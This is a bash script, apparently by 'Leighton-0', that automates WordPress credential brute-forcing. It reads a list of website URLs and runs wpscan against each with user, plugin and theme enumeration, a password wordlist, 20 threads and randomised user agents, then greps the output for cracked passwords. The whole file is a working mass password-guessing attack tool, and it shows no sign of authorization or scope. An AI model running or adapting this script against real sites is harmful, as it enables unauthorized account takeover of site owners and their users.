#!/bin/bash
# A script for auto brute forcing users based on wpscan
# COLOR INFORMATION
BLACK=$(tput setaf 0)
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
YELLOW=$(tput setaf 3)
LIME_YELLOW=$(tput setaf 190)
POWDER_BLUE=$(tput setaf 153)
BLUE=$(tput setaf 4)
MAGENTA=$(tput setaf 5)
CYAN=$(tput setaf 6)
WHITE=$(tput setaf 7)
BRIGHT=$(tput bold)
NORMAL=$(tput sgr0)
BLINK=$(tput blink)
UNDERLINE=$(tput smul)
# To reset the color information such that subsequent text is in the normal terminal color you would append ${NORMAL} to the end like so
# echo "${RED}this is red ${NORMAL}this is normal
# printf "%40s\n" "${blue}This text is blue${normal}"

clear

printf "${BLUE}\n########################################################################${NORMAL}\n"
printf "${BLUE}##                 WordPress Auto Brute Force Users                   ##${NORMAL}\n"
printf "${BLUE}##                     Leighton-0    (Jan 2023)                       ##${NORMAL}"
printf "${BLUE}\n########################################################################${NORMAL}\n"

sleep 3
#"result.${d}.parsed""result.${d}.parsed"
d=`date +"%y%m%d"`
	# creates a date variable in the form yymmdd
rm counter.txt
I=0
wl_pass=~/z_wp/wp_websites.csv-aa_1
wpscan --update
##read -p $'\e[1;92m File path for targets: \e[0m' wl_pass
	# -p prompt asks for a file name for the list of sites - names this site wl_pass
wl_pass="${wl_pass}"
	# creates a variable called wp_pass
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
	# cut -d " " -f1 -->> takes the only the numerical value from the wc -l output (eg 70 wp-links)
	# counts the number of lines in wp_pass file
for fn in `cat $wl_pass`; do
#printf "%s ${RED}TARGET NAME:- \n" $fn ${NORMAL}\n >> "results.${d}.1"
printf "${RED}\n================================================================================\n" >> "results.${d}.1"
printf "TARGET NAME:- %s \n" ${fn} >> "results.${d}.1"
wpscan --url $fn -e  u vp vt --passwords z_passwords --no-banner --no-update --random-user-agent --max-threads 20 --ignore-main-redirect --force >> "results.${d}"
	# Designed to identify uses and carry out dictionary attack
# wpscan --url $fn --no-update --random-user-agent --ignore-main-redirect --wp-version-detection aggressive --no-banner >> "results.${d}.1"
	# Designed to identify which sites are running WP from a file of IP addresses
	# --force disable WP detection; --wp-version-detection aggressive
I=$((I+1))
printf "Loop number %-1d of %-.3d \n" $I  $count_pass >> counter.txt

: << 'COMMENT'
##########  BY ME   #################
BLOCK COMMENT ANYTHING IN HERE
######################################
COMMENT

done

printf "Finished - check the results"
printf '\n\n\n\n'

#   README
#   Usefull for parsing results
#   cat result1 | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > result2 && less result2

#   TO DO
#   Improve Parsing
#   cat result1 | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > result2 && less result2
# cat results | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > "results.${d}.parsed" 

# cat results.${d} | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > "results.${d}.parsed"

cat results.${d}.parsed

#   README
#   Usefull for parsing results
#   cat result1 | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > result2 && less result2

#   TO DO
#   Improve Parsing
#   cat result1 | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > result2 && less result2
